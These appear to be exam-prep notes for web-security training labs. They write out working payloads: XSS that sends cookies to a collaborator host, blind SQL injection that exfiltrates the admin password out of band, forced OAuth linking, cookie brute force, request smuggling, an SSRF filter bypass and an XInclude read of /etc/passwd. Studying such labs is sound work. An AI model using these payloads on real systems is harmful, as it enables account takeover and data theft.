# Exam Prep Labs

**Exploiting cross-site scripting to steal cookies**

`<img src="1" onerror="window.location='https://BURP-COLLABORATOR-SUBDOMAIN/cookie='+document.cookie">`

or

```
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

Post these payloads in a comment, then obtain the cookie and replace this to gain admin access.

**Blind SQL injection with out-of-band data exfiltration**

Burp Active Scan identifies the TrackingId cookie as being injectible

Cookie: TrackingId=YhaxNa2jasATgGHz'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20nlmsj%20SYSTEM%20%22http%3a%2f%2f1wy2cf0dycy7ehcocpeua3wi79d31tpxdq0go5.oasti'%7c%7c'[fy.com](http://fy.com/)%2f%22%3e%25nlmsj%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'

'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % nlmsj SYSTEM "http://1wy2cf0dycy7ehcocpeua3wi79d31tpxdq0go5.oasti'||'fy.com/">%nlmsj;]>'),'/l') from dual)||'

`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

**Forced OAuth profile linking**

Login with social media = OAuth based attack

When linking a social media account using OAuth, there is a /oauth-linking request that includes a code. Intercept this request, copy the code and drop the request so it’s not used.

Load the following in the exploit server:

<iframe src="[https://0a8a0080041920d8c39e66a200870069.web-security-academy.net/oauth-linking?code=BPiIICdObOTAV8iCzGegnxhWHufrlosvT390IyfCidF](https://0a8a0080041920d8c39e66a200870069.web-security-academy.net/oauth-linking?code=BPiIICdObOTAV8iCzGegnxhWHufrlosvT390IyfCidF)"></iframe>

This will force the victim to link their account to your social media profile, as the code is associated to you.

**Brute-forcing a stay-logged-in cookie**

stay-logged in option when logging in

d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw

wiener:51dc30ddc473d43a6011e9ebba6ca770

username:MD5 hash of pw

- Hash: `MD5`
- Add prefix: `carlos:`
- Encode: `Base64-encode`

Add a grep-match rule to flag responses that have the “update email” option

Use Simple List Payload Type

**Exploiting HTTP request smuggling to capture other users' requests**

POST / HTTP/1.1
Host: [0a0e00c30425ea33c2c935fc0050003c.web-security-academy.net](http://0a0e00c30425ea33c2c935fc0050003c.web-security-academy.net/)
Cookie: session=f53lqUGiuNYoeUkf1Q7n3O2zn6JiXW7n
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: [https://0a0e00c30425ea33c2c935fc0050003c.web-security-academy.net/](https://0a0e00c30425ea33c2c935fc0050003c.web-security-academy.net/)
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 274
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Cookie: session=f53lqUGiuNYoeUkf1Q7n3O2zn6JiXW7n
Content-Type: application/x-www-form-urlencoded
Content-Length: 911

csrf=ZDq330LAbNseA4tASzvN5i2YGXznGaPG&postId=3&name=Carlos+Montoya&email=carlos%[40normal-user.net](http://40normal-user.net/)&website=&comment=t

HTTP Request Smuggler can identify that it is a CL.TE vuln, then build the steps so that the comment is left in the blog post. Make sure the content-length of the smuggled request is accurate.

**SSRF with blacklist-based input filter**

stockApi=http://127.0.0.1/admin

returns:

"External stock check blocked for security reasons”

stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65

shorten the notation for localhost, double URL encode “admin”

**SQL injection with filter bypass via XML encoding**

Use Active Scan on the Stock check, identifies Postgresql injection.

Convert/obfuscate payload using XML entities.Highlight input and right-click > Extensions > Hackvertor > Encode > dec_entities/hex_entities.

**Discovering vulnerabilities quickly with targeted scanning**

Send the stock check request to intruder, add the two insertion points and scan. Identifies XML injection via XInclude, which then allows you to identify the payload from previous labs

productId=<foo xmlns:xi="[http://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1